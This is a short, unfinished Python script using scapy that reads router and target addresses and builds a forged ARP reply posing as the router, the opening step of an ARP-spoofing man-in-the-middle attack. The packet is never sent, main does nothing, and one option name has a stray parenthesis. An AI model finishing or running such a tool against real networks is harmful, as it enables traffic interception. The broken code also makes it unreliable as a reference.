import scapy.all as scapy
import optparse


def get_arguments():

    parser = optparse.OptionParser()
    parser.add_option("-r", "--route", dest="route_ip", help="router ip address")
    parser.add_option("-t", "--target_ip)", dest="target_ip", help="target ip address")
    parser.add_option("-m", "--target_mac", dest="target_mac", help="target mac address")
    (options, arguments) = parser.parse_args()

    return options


def packets_create(options):

    target_ip = options.target_ip
    route_ip = options.route_ip
    target_mac = options.target_mac

    target_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=route_ip)


if __name__ == "__main__":
    pass
